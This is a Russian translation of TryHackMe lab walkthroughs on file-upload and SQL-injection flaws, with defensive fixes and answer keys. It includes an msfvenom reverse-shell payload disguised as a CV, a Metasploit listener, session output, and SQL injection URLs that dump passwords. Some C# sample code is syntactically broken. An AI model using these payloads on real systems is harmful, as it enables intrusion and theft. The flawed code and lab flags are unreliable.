образом изменить существующий контент — вплоть до внедрения вредоносных веб-страниц, что приводит к дополнительным 
уязвимостям, таким как межсайтовый скриптинг (XSS) или подделка межсайтовых запросов ( CSRF ). Загружая произвольные 
файлы, злоумышленник потенциально может использовать сервер для размещения и/или обслуживания нелегального контента 
или для утечки конфиденциальной информации. Реалистично говоря, злоумышленник, имеющий возможность загрузить на ваш 
сервер файл по своему выбору — без каких-либо ограничений — действительно очень опасен.         

Неограниченная загрузка файлов обычно имеет два основных пути эксплуатации:
- Если злоумышленник сможет получить загруженный файл, это может привести к выполнению кода, если злоумышленник 
  загрузит такой файл, как веб-оболочка. 
- Если файл просматривается пользователем (например, приложение CV), то злоумышленник может внедрить вредоносное ПО в 
  загруженный файл, которое будет запущено на рабочей станции пользователя после просмотра файла.
В предыдущих статьях много внимания уделялось RCE через веб-шеллы, поэтому в этой задаче мы сосредоточимся на 
  последнем способе эксплуатации. 

### Санта ищет помощника
эльфСанта ищет новых сотрудников для своей службы безопасности и нанял внештатного разработчика для создания 
веб-приложения, куда потенциальные кандидаты могут загружать свои резюме. Elf McSkidy знает, что риски третьих лиц 
могут быть серьезными, и поручил вам, Exploit McRed, протестировать это приложение перед его запуском. Поскольку 
праздники уже не за горами, нам придется сосредоточиться на основной функции веб-сайта, а именно на возможности 
загружать резюме.    

Elf McSkidy предоставил вам последнюю версию приложения. Запустите машину, подключенную к этой задаче, чтобы 
загрузить веб-сайт. После загрузки (примерно 2 минуты) вы можете перейти на http://MACHINE_IP/, чтобы просмотреть 
веб-сайт, используя AttackBox или ваше VPN- подключение TryHackMe:  

SantaSideKickВеб-сайт

Как мы видим, сайт позволяет нам загружать наши резюме для подачи заявки на работу в службу безопасности Санты. 
Прежде чем начать фактическое тестирование, давайте сначала попробуем использовать сайт по назначению, чтобы лучше 
понять, что происходит. Используя ваш любимый текстовый редактор, создайте простой новый PDF-файл и загрузите его в 
приложение. После загрузки мы увидим следующее сообщение:   

SantaSideKickВеб-сайт

Интересно! В сообщении также говорится, что с файлом будет человеческое (или, точнее, эльфийское) взаимодействие. 
Это требует дальнейшего расследования! 

Давайте посмотрим, что произойдет, если мы попытаемся загрузить что-то, кроме PDF, например исполняемый файл. Вы 
можете переименовать расширение файла вашего CV в EXE: 

SantaSideKickВеб-сайт

Кажется, это работает! Похоже, что разработчик-фрилансер попытался реализовать некоторые элементы управления 
безопасностью, чтобы предотвратить появление непослушных эльфов. Однако не все элементы управления были реализованы. 
Но можем ли мы на самом деле сделать с этим что-то вредоносное?  

Почему столько шума вокруг Web Root?
Так почему же разработчик должен заботиться о том, чтобы хранить файл вне корневого каталога веб-сайта? Веб-серверы 
— довольно простые вещи. Вы запрашиваете ресурс, а веб-сервер затем отвечает ресурсом. Волшебство происходит, когда 
запрашиваемый ресурс имеет определенный тип файла. Поскольку это приложение .NET, следующие типы ресурсов будут 
считаться особыми:   

АСП
ASPX
CSHTML
Когда ресурс запрашивается с одним из этих типов файлов, веб-сервер сначала выполнит некоторые инструкции, найденные 
на этих страницах, прежде чем отправить скомпилированный ответ обратно пользователю. Вот пример инструкции ASPX, 
которая будет выполнена сервером:  

`<form id="Form1" method="post" runat="server" EncType="multipart/form-data" action="Upload.aspx">`
Это сообщает серверу, что элемент HTML сначала требует некоторого форматирования перед добавлением в HTML в ответе, 
как видно из директивы runat="server". 

Если бы мы могли загрузить любой файл, который мы хотим, мы могли бы загрузить один из этих специальных типов 
страниц, например, веб-оболочку ASPX. Если бы этот файл хранился в корневом каталоге веб-сайта, мы могли бы 
запросить файл с сервера, заставив сервер выполнить код в нашем файле перед отправкой ответа. Было бы возможно 
получить удаленное выполнение кода на веб-сервере. Однако, поскольку файл хранится вне корневого каталога веб-сайта, 
мы не можем сделать запрос, который бы извлек наш загруженный файл для выполнения. Однако эта защита недостаточна по 
двум основным причинам:      

Могут существовать и другие уязвимости, такие как локальное включение файлов, которые позволяют нам заставить сам 
веб-сервер восстановить файл, который был сохранен вне веб-корня. Если веб-сервер восстановит файл, код внутри файла 
снова будет выполнен, что позволит выполнить RCE .  
Хотя мы, возможно, не можем получить RCE, используя эту уязвимость, мы точно знаем, что реальные пользователи будут 
взаимодействовать с файлами, которые мы загружаем. Вместо того, чтобы нацеливаться на веб-сервер напрямую, мы могли 
бы нацеливаться на пользователей, которые будут взаимодействовать с этими файлами. Если бы мы загрузили файл, 
содержащий вредоносное ПО, оно бы выполнилось, когда пользователь взаимодействовал с файлом, что все равно позволило 
бы нам нарушить периметр Санты!    
### Ракушка от Санты

Давайте попробуем нацелиться на одного из эльфов Санты, который будет просматривать загруженные резюме. В 
большинстве случаев нам придется быть весьма креативными с вредоносным ПО, которое мы загружаем, особенно поскольку 
это для заявки на роль безопасности! Это потребует от нас создания резюме со встроенным вредоносным макросом. Однако,
поскольку мы в красной команде Санты и это оценка безопасности, нам нужно только показать доказательство концепции. 
Давайте используем Metasploit для создания вредоносного резюме:    
```commandline
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT="Listening port" -f exe -o cv-username.exe
```

Затем вы также можете использовать следующее для создания соответствующего прослушивателя в msfconsole:
```commandline
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 'listening port'; exploit"
```


Как только у нас будет наше CV, мы можем снова загрузить файл. После загрузки дайте ему несколько минут, и один из 
этих эльфов должен просмотреть наше CV: 
```commandline
[*] Started reverse handler on 10.50.1.120:4444 [*] Starting the payload handler... [*] Sending stage (770048 bytes) to 10.10.1.20 [*] Meterpreter session 1 opened (10.50.1.120:4444 -> 10.10.1.20:1138) at 2022-10-22 19:03:43 -0500 meterpreter >
```

Этого достаточно для доказательства концепции, чтобы Эльф МакСкиди мог обратиться к Санте и потребовать внедрения 
дополнительных мер безопасности в приложение! Используя свою оболочку, прочитайте флаг из домашнего каталога 
конкретного эльфа.  

Правильная защита загрузок файлов

Чтобы адекватно защитить функцию загрузки файлов, нам нужно будет реализовать слои защиты. В этой задаче мы будем 
использовать загрузку файла C# в качестве примера. C# — популярный язык, используемый для создания как приложений 
Windows, так и веб-приложений в крупных организациях. Давайте сначала рассмотрим нашу базовую функцию загрузки файлов:  

Загрузить.cshtml
```commandline
public IActionResult OnPostUpload(FileUpload fileUpload)
    {   
        var fullPath = "D:\CVUploads\"
        var formFile = fileUpload.FormFile;
        var filePath = Path.Combine(fullPath, formFile.FileName);

        using (var stream = System.IO.File.Create(filePath))
            {
                formFile.CopyToAsync(stream);
            }
    }
```

Как мы видим, разработчик позаботился о том, чтобы сохранить CV вне корневого каталога веб-сайта, указав полный путь 
к другому диску (D:\CVUploads). Однако этого недостаточно. Давайте посмотрим, какие дополнительные элементы 
управления можно реализовать:  
Проверка содержимого файла

Мы можем проверить содержимое файла, просмотрев заголовок ContentType, который отправляется браузером при загрузке 
файла: 

Загрузить.cshtml
```commandline
string contentType = fileUpload.ContentType.Split('/')[1].ToLower();
if !(contentType.equals("ContentType=PDF")
    {
        allowed = False;
    }
```

Если тип содержимого файла не PDF, мы отклоним файл. Хотя это хороший контроль, следует отметить, что поскольку 
браузер устанавливает этот заголовок, злоумышленник может обойти этот контроль, перехватив запрос и изменив заголовок. 
Проверка расширения файла

Мы также можем проверить расширение файла. Это позволит нам ограничить тип файлов, которые можно загрузить. Поэтому 
мы можем добавить следующие строки в наш код: 

Загрузить.cshtml
```commandline
string contentExtension = Path.GetExtension(fileUpload);
if !(contentExtension.equals("PDF"))
    {
        allowed = False;
    }
```

Это ограничит типы файлов только PDF. Если CV пользователя находится в другом формате, ему сначала придется 
преобразовать свое CV. В идеале этот контроль должен быть реализован с помощью списка разрешенных, как показано выше,
поскольку в некоторых случаях черный список все еще можно обойти.  
### Проверка размера файла

Атакующие также могут попытаться загрузить файлы, которые настолько велики, что занимают так много места на диске, 
что другие потенциальные кандидаты не смогут загрузить свои резюме. Чтобы предотвратить это, мы можем реализовать 
элементы управления проверкой размера файла:  

Загрузить.cshtml
```commandline
int contentSize = fileUpload.ContentLength;
//10Mb max file size
int maxFileSize = 10 * 1024 * 1024
if (contentSize > maxFileSize)
    {
        allowed = False;
    }
```

Это позволит использовать только файлы размером меньше указанного.
Переименование файла

Как упоминалось ранее, даже если наши загрузки хранятся вне корневого каталога веб-сайта, злоумышленник может 
воспользоваться дополнительной уязвимостью, такой как включение файла, чтобы выполнить файл. Чтобы противостоять 
этим попыткам, мы можем попытаться переименовать загруженные файлы в случайные имена, что сделает практически 
невозможным для злоумышленника восстановить свой файл по имени:   

Загрузить.cshtml
```commandline
Guid id = Guid.NewGuid();
var filePath = Path.Combine(fullPath, id + ".pdf");
```

Сканирование на наличие вредоносных программ

Даже при реализации всех вышеперечисленных мер контроля все еще существует риск того, что злоумышленник загрузит 
вредоносный файл, нацеленный на эльфов, которые будут просматривать резюме. Поскольку Санта — высокоценная личность, 
некоторые национальные государства могут даже использовать специализированные эксплойты, найденные в программах для 
чтения PDF-файлов, для загрузки вредоносного PDF-файла в надежде получить доступ и удалить себя из списка 
непослушных файлов Санты! Для борьбы с этими типами вредоносных файлов мы можем сканировать загруженные файлы на 
наличие вредоносного ПО. Мы можем установить такой пакет, как ClamAV, и использовать его для сканирования 
содержимого каждого загруженного файла:      

Загрузить.cshtml
```commandline
var clam = new ClamClient(this._configuration["ClamAVServer:URL"],Convert.ToInt32(this._configuration["ClamAVServer:Port"])); 
var scanResult = await clam.SendAndScanFileAsync(fileBytes);  
  
if (scanResult.Result == ClamScanResults.VirusDetected)
    {
        allowed = False;
    }; 
```

Собираем все вместе

Объединив все вышеперечисленные методы, мы можем реализовать функцию безопасной загрузки файлов, как показано ниже:

Загрузить.cshtml

```commandline
public IActionResult OnPostUpload(FileUpload fileUpload)
    {
        var allowed = True;

        //Store file outside the web root   
        var fullPath = "D:\CVUploads\"

        var formFile = fileUpload.FormFile;

        //Create a GUID for the file name
        Guid id = Guid.NewGuid();
        var filePath = Path.Combine(fullPath, id + ".pdf");

        //Validate the content type
        string contentType = fileUpload.ContentType.Split('/')[1].ToLower();
        if !(contentType.equals("ContentType=PDF")
            {
                allowed = False;
            }

       //Validate the content extension
       string contentExtension = Path.GetExtension(fileUpload);
       if !(contentExtension.equals("PDF"))
           {
               allowed = False;
           }

       //Validate the content size
       int contentSize = fileUpload.ContentLength;
       //10Mb max file size
       int maxFileSize = 10 * 1024 * 1024
       if (contentSize > maxFileSize)
           {
               allowed = False;
           }

       //Scan the content for malware
       var clam = new ClamClient(this._configuration["ClamAVServer:URL"],Convert.ToInt32(this._configuration["ClamAVServer:Port"])); 
       var scanResult = await clam.SendAndScanFileAsync(fileBytes);  
  
       if (scanResult.Result == ClamScanResults.VirusDetected)
           {
                allowed = False;
           };

       //Only upload if all checks are passed
       if (allowed)
       {
            using (var stream = System.IO.File.Create(filePath))
                {
                    formFile.CopyToAsync(stream);
                }
       }
    }
```
Все эти элементы управления необходимы по той простой причине, что мы не можем изначально доверять пользовательскому 
вводу. Таким образом, пользовательский ввод должен быть проверен и проконтролирован! Отправка этого отзыва 
разработчику-фрилансеру позволит им защитить функцию загрузки файлов!   

### Ответить на вопросы ниже
Как называется загрузка файлов, которая позволяет злоумышленникам загружать любые файлы по своему усмотрению?
```commandline
Unrestricted
```
Как называется веб-приложение, разработанное фрилансером Санты?
```commandline
SantaSideKick2
```
Каково значение флага, хранящегося в каталоге документов HR Elf?
```commandline
THM{Naughty.File.Uploads.Can.Get.You.RCE}
```
Какую технику защиты можно реализовать, чтобы гарантировать возможность загрузки определенных типов файлов?
```commandline
File Extension Validation
```
Какую технику защиты можно использовать, чтобы гарантировать, что злоумышленник не сможет снова восстановить свой файл, просто используя имя файла?
```commandline
File Renaming
```
Какую технику защиты можно использовать, чтобы гарантировать, что вредоносные файлы, которые могут навредить эльфам, не будут загружены?
```commandline
Malware Scanning
```
Если вы хотите узнать больше о таких уязвимостях, ознакомьтесь с нашим  модулем «Введение в веб-хакинг»  ! 
```commandline
Ответ не нужен
```
## Задание 21
Посмотрите видеообзор InsiderPhD на 16-й день здесь !

Настроившись на защиту всех своих приложений, эльфы обратились к тому, который Санта использует для управления 
доставкой подарков на Рождество. Elf McSkidy попросил Elf Exploit и Elf Admin помочь вам очистить приложение от 
SQL-инъекций. Когда им показали код приложения, оба эльфа выглядели немного шокированными, так как никто из них не 
знал, как его осмыслить, не говоря уже о том, чтобы исправить. «Раньше у нас был Elf McCode, но он основал стартап и 
больше нам не помогает» , — сказал Admin.    

После небольшого разговора было решено. Эльфы вернулись, неся остроконечную шляпу, и назначили вас новым эльфом 
МакКодом. Поздравляю с повышением! 

Развертывание виртуальной машины

В ходе выполнения этой задачи вы будете использовать виртуальную машину ( ВМ ), на которой уже установлены все 
необходимые инструменты. Инструкции о том, что доступно и как это использовать, будут предоставлены далее. Поскольку 
запуск ВМ занимает пару минут, может быть хорошей идеей нажать кнопку в правом верхнем углу этой задачи сейчас. Для 
доступа к содержимому машины вам понадобится только ваш браузер ( для этого Start Machineвам не понадобятся 
AttackBox или VPN ).    

### Обновление знаний SQL

Язык структурированных запросов ( SQL ) — традиционный язык, используемый для запроса информации из баз данных. 
Когда вы создаете любое приложение, которое опирается на базу данных, приложению нужно будет создавать предложения 
SQL на лету и отправлять их в ядро базы данных для извлечения необходимой информации для работы вашего приложения. 
К счастью для вас, SQL был создан с учетом простоты, и его синтаксис должен напоминать простые английские 
предложения, чтобы программистам было легче его понимать.    

Но прежде чем объяснять синтаксис SQL, давайте поговорим о конкретном движке базы данных, используемом в нашем 
приложении: MySQL. MySQL хранит информацию в структурах, называемых таблицами. Думайте о них как о любой таблице в 
документе электронной таблицы, где у вас есть столбцы и строки . Для ясности давайте проверим одну из таблиц, 
используемых в текущем приложении, где хранятся игрушки:   

### Таблица базы данных

Как вы видите, каждая строка таблицы соответствует отдельной игрушке, а каждый столбец — это поле данных, 
описывающее игрушку. Глядя на третью строку, мы видим, что наша таблица игрушек содержит игрушку под названием 
«Автомобиль» и что для нее доступно 12 единиц. Довольно просто.  

Как упоминалось ранее, когда приложению необходимо извлечь информацию из базы данных, ему необходимо построить SQL- 
запрос . Запросы — это простые инструкции, которые запрашивают определенные данные в структурированном виде, который 
база данных может понять. Для запроса информации мы будем использовать операторы SELECT , указывающие, какие строки 
какой таблицы мы хотим извлечь. Если бы мы хотели получить все столбцы из таблицы «toys» в нашей базе данных, мы 
могли бы использовать следующий оператор:    
```commandline
SELECT * FROM toys;
```

Простой запрос выбора

Обратите внимание на звездочку (*), которая указывает, что вы хотите получить все столбцы из таблицы. Если вам нужно 
запросить определенные столбцы, вы можете заменить звездочку списком столбцов, разделенных запятыми. Например, чтобы 
получить только столбцы имени и количества, вы можете выполнить следующий SQL- запрос:   
```commandline
SELECT name, quantity FROM toys;
```

выберите определенные столбцы

Все строки таблицы возвращаются в обоих случаях, но вы можете отфильтровать их, если необходимо, используя 
предложение WHERE . Предположим, вы хотите отфильтровать результаты последнего запроса, чтобы получить только те 
игрушки, для которых есть по крайней мере количество 20. Вы можете сделать это с помощью следующего оператора:   
```commandline
SELECT name, quantity FROM toys WHERE quantity >= 20;
```

Использование фильтров WHERE

В реальных приложениях вы, скорее всего, столкнетесь с гораздо более сложными запросами в некоторых случаях, но того,
что мы рассмотрели до сих пор, должно быть достаточно для остальных. 

### Отправка SQL-запросов из PHP

Теперь, когда мы понимаем, как работает оператор SELECT, давайте посмотрим, как приложение PHP создает и отправляет 
такой запрос в MySQL. Хотя мы фокусируемся на PHP и MySQL, та же идея обычно применима и к другим языкам 
программирования.  

Первым шагом всегда является получение соединения с базой данных из нашего кода. Для этого PHP включает расширение 
mysqli , которое предоставляет mysqli_connect()функцию. Функция получает IP или имя сервера базы данных в качестве 
первого параметра ( $server), за которым следуют имя пользователя ( $user) и пароль ( $pwd), и, наконец, имя 
используемой схемы ( $schema), которая является просто идентификатором базы данных, к которой мы подключаемся. В 
результате функция возвращает обработчик соединения, который можно использовать для отправки дальнейших SQL- 
запросов. Думайте об обработчике соединения как о переменной, которая содержит информацию о соединении с базой 
данных, чтобы можно было отправлять запросы к ней:       
```commandline
$server="db";
$user="logistics_user";
$pwd="somePass123";
$schema="logistics";

$db=mysqli_connect($server,$user,$pwd,$schema);
```

После того, как соединение установлено, мы можем выдавать SQL- запросы с помощью mysqli_query()функции. Первый 
параметр, который мы передаем в функцию, — это обработчик соединения, который мы получили ранее, а второй параметр — 
это строка с нашим SQL- запросом:  
```commandline
$query="select * from users where id=1";
$elves_rs=mysqli_query($db,$query);
```

В результате выполнения запроса мы получаем набор результатов SQL и сохраняем его в $elves_rsпеременной в нашем 
примере. Набор результатов — это не что иное, как объект, содержащий результаты нашего запроса, который может быть 
использован в остальной части нашей программы для доступа к полученным данным.  

Как видите, все так же просто, как создать строку с нашим запросом и отправить ее в базу данных! 

Создание динамических веб-сайтов

А вот тут-то и начинается самое интересное. Если вы проверите веб-приложение Санты, то сможете получить доступ к 
профилю эльфа, используя URL-адрес вроде этого: 

http://LAB_WEB_URL.p.thmlabs.com/webapp/elf.php?id=2

Профиль Эльфа Макскиди

В зависимости от числа, которое вы указываете в idпараметре URL, вы получаете профиль другого эльфа. За кулисами это 
работает путем создания SQL- запроса, который встраивает id значение параметра и возвращает информацию о 
соответствующем эльфе.  

Создание динамических запросов

В коде это будет выглядеть так:
```commandline
$query="select * from users where id=".$_GET['id'];
$elves_rs=mysqli_query($db,$query);
```

Первая строка создает SQL- запрос, объединяя $_GET['id']переменную как часть предложения where. Обратите внимание, 
что в PHP вы можете получить доступ к любому параметру в URL как $_GET['name_of_parameter']. Этот запрос запросит у 
базы данных все столбцы таблицы users, которые соответствуют эльфу с определенным идентификатором. Вторая строка 
отправляет запрос и возвращает информацию об одном конкретном эльфе в качестве набора результатов, который мы 
сохраняем в переменной $elves_rs. Затем остальная часть веб-сайта анализирует набор результатов и отображает 
страницу соответствующим образом.     

Если вы протестируете веб-сайт, вы увидите, что он работает так, как и ожидалось. Однако вы ввели уязвимость SQL- 
инъекции в свой код, которая может позволить злоумышленнику сбросить всю вашу базу данных! 

### SQL -инъекция ( SQLi )

Проблема с показанным ранее методом заключается в том, что он принимает ненадежные входные данные от пользователя и 
объединяет их в SQL-запрос без каких-либо вопросов. Как видно из задачи предыдущего дня, наше приложение должно 
тщательно проверять любые входные данные, отправляемые пользователем, перед их использованием. Если этого не сделать,
могут произойти непредвиденные вещи.   

В случае SQL и нашего примера злоумышленник может отправить синтаксис SQL через один из различных параметров 
URL-адресов приложения, который в конечном итоге может быть объединен с некоторым SQL- запросом в коде, что может 
изменить его предполагаемое назначение.  

Давайте вернемся к странице профиля эльфа, чтобы лучше это понять. Помните, что приложение создает запрос, объединяя 
все, что отправлено в idпараметре как часть предложения WHERE: 

$query="select * from users where id=".$_GET['id'];
Если злоумышленник отправляет следующее через параметр id URL-адреса:

http://LAB_WEB_URL.p.thmlabs.com/webapp/elf.php?id=-1 ИЛИ id = 4

Когда PHP добавит «-1 OR id = 4» к нашему SQL- выражению, в результате получится следующий запрос:

select * from users where id=-1 OR id = 4
Внезапно злоумышленник внедрил некий синтаксис SQL , который при объединении с нашим исходным запросом приводит к 
предоставлению данных эльфа по id=4какой-то странной причине. 

### SQL-инъекция 101

Если мы прочитаем полученную строку запроса, то увидим, что наше предложение WHERE было изменено для фильтрации 
только тех эльфов, которые имеют id=-1или id=4. Поскольку значения идентификаторов, используемые базой данных, 
скорее всего, являются положительными числами, ни один эльф не будет соответствовать id=-1. Поэтому база данных 
вернет только эльфа с id=4.   

Хотя этот пример демонстрирует безвредную инъекцию, опытный злоумышленник может попытаться заставить ваш сервер 
выполнять гораздо более сложные SQL- запросы и потенциально заставить базу данных возвращать любые данные в любой 
таблице, которые он хочет. Просто в качестве примера посмотрите, что произойдет, если вы поместите следующее в 
idпараметр:   

http://LAB_WEB_URL.p.thmlabs.com/webapp/elf.php?id=-1 union all select null,null,username,password,null,null,null from users

SQL-инъекция заставит базу данных вернуть всех пользователей и пароли приложения. Санте это точно не понравится! 
Если вам интересно узнать больше о SQL-инъекции с точки зрения злоумышленника, вы можете проверить комнату SQL 
-инъекции . Однако в оставшейся части этой задачи мы сосредоточимся на оборонительной стороне и рассмотрим способы 
предотвращения SQL-инъекций в нашем коде, поэтому не беспокойтесь слишком сильно, если указанный выше URL покажется 
сложным для понимания.    

Исправление приложения с помощью Elf Exploit и Elf Admin

Вооружившись всеми этими знаниями, мы готовы исправить приложение. У вас будет доступ к простому редактору для 
изменения исходного кода приложения во время этой задачи. Любые изменения, которые вы внесете в редакторе, будут 
немедленно реализованы, если вы сохраните их (нажав CTRL+S). Если вы используете VPN-подключение, вы можете получить 
доступ к редактору кода из любого браузера по вашему выбору. Если вы используете AttackBox, Firefox установлен и 
доступен на рабочем столе машины. Чтобы попасть в редактор кода, укажите в своем браузере следующий адрес:    

http://LAB_WEB_URL.p.thmlabs.com/

Для входа в редактор кода используйте следующие учетные данные:

ТМ-ключ
Имя пользователя	кодер
Пароль	кодер
В дополнение к редактору кода у вас будет доступ к чату для общения с Elf Exploit и Elf Admin. Хотя они не слишком 
много говорят, вы можете попросить их проверить приложение для вас. Если вы правильно помните, они ничего не знают о 
кодировании. Однако Elf Exploit поможет вам определить части приложения, которые уязвимы для SQLi . Elf Admin, с 
другой стороны, проверит, что приложение работает так, как ожидалось, поэтому, если вы внесете изменение, которое 
каким-то образом сломает приложение, он сообщит вам об этом, чтобы вы могли откатиться и попробовать снова. В 
совокупности они сообщат вам, устраняют ли ваши изменения уязвимости, избегая при этом изменения того, как 
приложение должно работать.      

### Макет редактора кода

Чтобы попросить эльфов провести повторную проверку приложения, прокрутите чат эльфов вниз и найдите кнопку 
«Выполнить проверку»: 

Кнопка «Выполнить проверку»

Помните, что вы всегда можете проверить сайт после любых изменений, перейдя по следующей ссылке:

http://LAB_WEB_URL.p.thmlabs.com/webapp/

А теперь приступим к работе!

Исправление SQLi путем проверки типа данных

Один из самых простых и эффективных способов предотвратить SQL-инъекции — убедиться, что любые данные, которыми 
может манипулировать пользователь, которые вы объединяете как часть SQL-выражения, на самом деле относятся к 
ожидаемому вами типу. Давайте перейдем в наш чат elf и нажмем кнопку Run Checks .  

Elf Exploit должен сообщить вам, что он успешно внедрил некоторый SQL через параметр id elf.php. Давайте откроем 
этот файл в нашем редакторе кода и посмотрим на строки 4-5: 
```commandline
$query="select * from users where id=".$_GET['id'];
$elves_rs=mysqli_query($db,$query);
```

Веб-сайт берет id параметр из URL-адреса и объединяет его с SQL- запросом, как показано ранее.

Мы можем обоснованно предположить, что веб-сайт ожидает idотправки целого числа. Чтобы избежать инъекций, мы можем 
преобразовать все, что пользователь вводит в параметре id, в целое число. Для этой цели мы будем использовать 
функцию intval(). Эта функция возьмет строку и попытается преобразовать ее в целое число. Если в строке не будет 
найдено допустимого целого числа, она вернет 0, что также является целым числом. Чтобы прояснить это, давайте 
рассмотрим некоторые значения и то, как они будут преобразованы:    
```commandline
intval("123") = 123
intval("tryhackme") = 0
intval("123tryhackme") = 123
```

Используя это, мы можем изменить строку 4 так, elf.phpчтобы она выглядела следующим образом:
```commandline
$query="select * from users where id=".intval($_GET['id']);
```

Таким образом, даже если злоумышленник отправит полезную нагрузку SQL- инъекции через параметр id, приложение 
попытается преобразовать ее в целое число, прежде чем объединить ее как часть оператора SQL . В худшем случае строка 
преобразуется в 0, что в данном конкретном случае все еще безвредно.  

Обязательно нажмите , CTRL+Sчтобы сохранить изменения в документе, и попросите эльфов перепроверить приложение. На 
этот раз Elf Exploit снова скажет вам, что он может внедрить SQL , но другим способом. Это происходит потому, что 
idпараметр используется дважды для elf.php формирования двух отдельных SQL-запросов: один для получения информации об 
эльфе, а другой для получения любых созданных им игрушек. Найдите, где это происходит, и исправьте уязвимость. Как 
только вы это сделаете, попросите эльфов перепроверить, и если ваше исправление верно, вы получите первый флаг.    

Обратите внимание, что для большинства типов данных вы сможете сделать что-то похожее. Если вы ожидаете получить 
число с плавающей точкой, вы можете использовать floatval()то же самое. Даже если значения не числовые, а следуют 
определенной структуре, вы можете реализовать собственные валидаторы, чтобы гарантировать, что данные соответствуют 
заданному формату. Подумайте, например, о параметре, используемом для отправки IP-адресов. Вы можете быстро 
реализовать простую функцию для проверки правильности формирования IP-адреса и отказаться от выполнения SQL-запроса, 
если это не так.     

Исправление SQLi с помощью подготовленных операторов

Хотя в некоторых случаях вы можете защитить свой код с помощью простого валидатора, существуют ситуации, когда вам 
нужно разрешить пользователю передавать произвольные строки через параметр. Один из примеров этого можно увидеть в 
строке поиска нашего приложения.  

Каждый раз, когда выполняется поиск, он отправляется в search-toys.php через qпараметр. Если вы попросите эльфов 
перепроверить приложение прямо сейчас, Elf Exploit должен иметь способ воспользоваться уязвимостью в этом параметре. 
Если мы откроем search-toys.phpв нашем редакторе кода, мы можем быстро увидеть, что запрос построен в строках 4-5:    
```commandline
$query="select * from toys where name like '%".$_GET['q']."%' or description like '%".$_GET['q']."%'";
$toys_rs=mysqli_query($db,$query);
```

Здесь qпараметр дважды объединяется в одно и то же предложение SQL . Обратите внимание, что в обоих случаях данные 
qзаключены в одинарные кавычки, так вы представляете строку в SQL. Проблема с тем, что PHP создает запрос, 
заключается в том, что у базы данных нет другого выбора, кроме как доверять тому, что ей дают. Если злоумышленник 
каким-то образом внедрит SQL, PHP слепо объединит внедренную полезную нагрузку в строку запроса, и база данных 
выполнит ее.    

### Создание SQL-запроса путем конкатенации

Хотя есть несколько способов сделать это, самый безопасный вариант — использовать подготовленные операторы для 
предотвращения SQL- инъекций. 

Подготовленные операторы позволяют вам отделить синтаксис вашего предложения SQL от фактических параметров, 
используемых в вашем предложении WHERE. Вместо того, чтобы создавать одну строку путем конкатенации, вы сначала 
опишете структуру вашего запроса SQL и используете заполнители для указания положения параметров вашего запроса. 
Затем вы привяжете параметры к подготовленному оператору в отдельном вызове функции.    

Создание SQL-запросов с помощью подготовленных операторов

Вместо предоставления одной строки запроса SQL, мы будем отправлять любые динамические параметры отдельно от самого 
запроса, позволяя базе данных надежно склеивать части вместе, не завися от PHP или программиста. Давайте посмотрим, 
как это выглядит в коде.  

Сначала мы изменим наш первоначальный запрос, заменив любой параметр на заполнитель, обозначенный вопросительным 
знаком ( ?). Это сообщит базе данных, что мы хотим выполнить запрос, который принимает два параметра в качестве 
входных данных. Затем запрос будет передан в функцию mysqli_prepare()вместо нашего обычного mysqli_query(). 
mysqli_prepare()пока не выполнит запрос, но укажет базе данных подготовить запрос с заданным синтаксисом. Эта 
функция вернет подготовленный оператор.    
```commandline
$query="select * from toys where name like ? or description like ?";
$stmt = mysqli_prepare($db, $query);
```

Для выполнения нашего запроса MySQL необходимо знать значение, которое следует поместить в каждый плейсхолдер, 
который мы определили ранее. Мы можем использовать функцию mysqli_stmt_bind_param()для присоединения переменных к 
каждому плейсхолдеру. Эта функция требует отправки следующих параметров функции:  

Первый параметр должен быть ссылкой на подготовленный оператор, к которому следует привязать переменные. 

Второй параметр — это строка, состоящая из одной буквы на каждый плейсхолдер, который нужно привязать, где буквы 
указывают тип данных каждой переменной. Поскольку мы хотим передать две строки, мы указываем "ss"второй параметр, 
где каждая «s» представляет переменную строкового типа. Вы также можете использовать буквы «i» для целых чисел или 
«d» для чисел с плавающей точкой. Полный список можно посмотреть в документации PHP .    

После этого вам нужно будет передать сами переменные. Вы должны добавить столько переменных, сколько плейсхолдеров 
определено ? в вашем запросе, в нашем случае их два. Обратите внимание, что в нашем примере оба параметра имеют 
одинаковое содержимое, но в других случаях это может быть не так.  

Результирующий код для этого будет следующим:
```commandline
$q = "%".$_GET['q']."%";
mysqli_stmt_bind_param($stmt, 'ss', $q, $q);
```

После того как мы создали оператор и связали требуемые параметры, мы выполним подготовленный оператор с помощью 
mysqli_stmt_execute(), который получает оператор $stmtв качестве своего единственного параметра. 

mysqli_stmt_execute($stmt);
Наконец, когда оператор выполнен, мы можем получить соответствующий набор результатов с помощью 
mysqli_stmt_get_result(), передав оператор в качестве единственного параметра. Мы назначим набор результатов 
переменной, $toys_rsкак в исходном коде.  
```commandline
$toys_rs=mysqli_stmt_get_result($stmt);
```

Наш окончательный код должен выглядеть так:
```commandline
$q = "%".$_GET['q']."%";
$query="select * from toys where name like ? or description like ?";
$stmt = mysqli_prepare($db, $query);
mysqli_stmt_bind_param($stmt, 'ss', $q, $q);
mysqli_stmt_execute($stmt);
$toys_rs=mysqli_stmt_get_result($stmt);
```

Обязательно сохраните изменения с помощью CTRL+S. Если вы попросите эльфов перепроверить приложение, они должны 
будут сказать вам, что уязвимость устранена, и дать вам второй флаг. 

### Завершение работы

В коде еще есть несколько уязвимостей SQLi , которые нужно исправить. Используя помощь Elf Exploit и Elf Admin, а 
также полученные нами знания, закройте оставшиеся уязвимости, чтобы получить больше флагов. Удачи! 

### Ответить на вопросы ниже
Каково значение Flag1?

```commandline
THM{McCode, Elf McCode}
```
Каково значение Flag2?
```commandline
THM{KodeNRoll}
```
Какова ценность Flag3?
```commandline
THM{Are we secure yet?}
```
Какова ценность Flag4?
```commandline
THM{SQLi_who???}
```
Если вы хотите больше SQLi в своей жизни, посетите эту комнату! 
```commandline
Ответ не нужен
```

## Задание 22
Посмотрите видеообзор InsiderPhD на 17-й день  здесь !

После обработки неограниченных загрузок файлов и уязвимостей SQLi, McSkidy продолжила проверку веб-приложений Санты. Она наткнулась на отправленные пользователями данные, которые не поддаются распознаванию, а некоторые даже граничат с вредоносными! Затем она обнаружила, что команда Санты давно не обновляла эти веб-приложения, поскольку им явно требовалось больше элементов управления для фильтрации несанкционированного использования. Можете ли вы помочь McSkidy в исследовании и изучить полезную технику для решения этой проблемы в будущем? 

Введение

